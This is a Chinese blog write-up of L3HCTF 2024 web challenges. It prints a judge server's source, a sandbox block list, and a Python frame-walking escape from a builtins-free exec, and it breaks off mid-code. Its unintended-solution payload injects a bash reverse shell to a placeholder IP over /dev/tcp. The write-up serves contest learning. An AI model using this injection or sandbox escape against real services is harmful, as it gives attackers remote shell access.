
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>L3HCTF 2024 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intractable-problem-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">intractable problem (复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Revenge"><span class="toc-number">2.1.2.</span> <span class="toc-text">Revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">正解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E8%A7%A3"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">其它解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#escape-web-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">escape-web (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#short-url-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.3.</span> <span class="toc-text">short url (复现)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">3.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#End-of-Programming"><span class="toc-number">3.2.</span> <span class="toc-text">End_of_Programming</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>L3HCTF 2024</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/4
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Nodejs/" style="color: #03a9f4">Nodejs</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #03a9f4">沙箱逃逸</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/python/" style="color: #ffa2c4">python</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">3.5k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">18分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一刻也没有为N1 Junior的结束哀悼，立刻赶到战场的是——L3HCTF</p>
<p>摸个源码等复现了（</p>
<p>参考：</p>
<p>S1uM4i的wp：<a target="_blank" rel="noopener" href="https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne">https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne</a></p>
<p>zer0peach的wp：<a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/">https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/</a></p>
<p>官方wp：<a target="_blank" rel="noopener" href="https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c">https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</a></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="intractable-problem-复现"><a href="#intractable-problem-复现" class="headerlink" title="intractable problem (复现)"></a>intractable problem (复现)</h2><blockquote>
<p>python利用栈帧实现沙盒逃逸</p>
</blockquote>
<p>web.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> time
<span class="token keyword">import</span> random
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess

codes<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"oj.py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    codes<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    flag<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'ui.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/judge'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"def factorization(n: string) -> tuple[int]:"</span><span class="token punctuation">,</span><span class="token string">"def factorization(n):"</span><span class="token punctuation">)</span>
    correctstr <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    wrongstr <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>correctstr<span class="token punctuation">,</span>wrongstr<span class="token punctuation">)</span>
    code<span class="token operator">=</span>codes<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"Correct"</span><span class="token punctuation">,</span>correctstr<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">,</span>wrongstr<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;&lt;codehere>>"</span><span class="token punctuation">,</span>code<span class="token punctuation">)</span>

    filename <span class="token operator">=</span> <span class="token string">"upload/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename <span class="token operator">+</span> <span class="token string">'.py'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'python3'</span><span class="token punctuation">,</span> filename <span class="token operator">+</span> <span class="token string">'.py'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filename <span class="token operator">+</span> <span class="token string">'.py'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>correctstr<span class="token operator">+</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token string">"Correct!flag is "</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filename <span class="token operator">+</span> <span class="token string">'.py'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token string">"Timeout!"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>oj.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> os

codes<span class="token operator">=</span><span class="token triple-quoted-string string">'''
&lt;&lt;codehere>>
'''</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    codes<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token string">"__"</span> <span class="token keyword">in</span> codes<span class="token punctuation">:</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

codes<span class="token operator">+=</span><span class="token string">"\nres=factorization(c)"</span>
<span class="token builtin">locals</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span><span class="token string">"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863"</span><span class="token punctuation">,</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
res<span class="token operator">=</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blackFunc</span><span class="token punctuation">(</span>oldexit<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        blackList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">,</span><span class="token string">"sys"</span><span class="token punctuation">,</span><span class="token string">"interpreter"</span><span class="token punctuation">,</span><span class="token string">"cpython"</span><span class="token punctuation">,</span><span class="token string">"open"</span><span class="token punctuation">,</span><span class="token string">"compile"</span><span class="token punctuation">,</span><span class="token string">"__new__"</span><span class="token punctuation">,</span><span class="token string">"gc"</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> blackList<span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>event <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                oldexit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> func

code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>codes<span class="token punctuation">,</span> <span class="token string">"&lt;judgecode>"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>blackFunc<span class="token punctuation">(</span>os<span class="token punctuation">.</span>_exit<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">locals</span><span class="token punctuation">[</span><span class="token string">"res"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">locals</span><span class="token punctuation">[</span><span class="token string">"res"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">1e5</span> <span class="token keyword">and</span> q<span class="token operator">></span><span class="token number">1e5</span> <span class="token keyword">and</span> p<span class="token operator">*</span>q<span class="token operator">==</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>稍微审一下我们就会发现，我们输的内容会被拼接到上面的 codes 中</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">codes<span class="token operator">=</span><span class="token triple-quoted-string string">'''
&lt;&lt;codehere>>
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>明显能直接进行命令注入</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240207171223912.png" alt="image-20240207171223912"></p>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token string">"def factorization(n: string) -> tuple[int]:\n\treturn 1'''\nos.system('bash -c \"bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/14723 0>&amp;1\"')\n'''"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240207171001567.png" alt="image-20240207171001567"></p>
<hr>
<h3 id="Revenge"><a href="#Revenge" class="headerlink" title="Revenge"></a>Revenge</h3><p>先了解一下，下面这段代码能逃出exec布置的<code>&quot;__builtins__&quot;: None</code>环境，得到<code>__globals__</code>，从而获得builtins，原理是利用python的栈帧</p>
<p>参考：<a target="_blank" rel="noopener" href="https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82">https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
g <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">,</span> gl<span class="token operator">:=</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span> <span class="token keyword">for</span> g <span class="token keyword">in</span> a<span class="token punctuation">)</span>
a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">)</span>
g<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>接下来是任意内存读写的部分，二进制先放着了</del></p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md">https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md</a></p>
<h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>审计代码，首先是过滤了<code>__</code></p>
<p>然后过滤了一些属性，导致不能通过gc去获取对象引用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">blackList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"process"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">,</span><span class="token string">"sys"</span><span class="token punctuation">,</span><span class="token string">"interpreter"</span><span class="token punctuation">,</span><span class="token string">"cpython"</span><span class="token punctuation">,</span><span class="token string">"open"</span><span class="token punctuation">,</span><span class="token string">"compile"</span><span class="token punctuation">,</span><span class="token string">"__new__"</span><span class="token punctuation">,</span><span class="token string">"gc"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后是<code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code></p>
<p>所以我们需要通过<strong>栈帧对象</strong>逃逸出沙箱从而获取到沙箱外的<code>globals</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
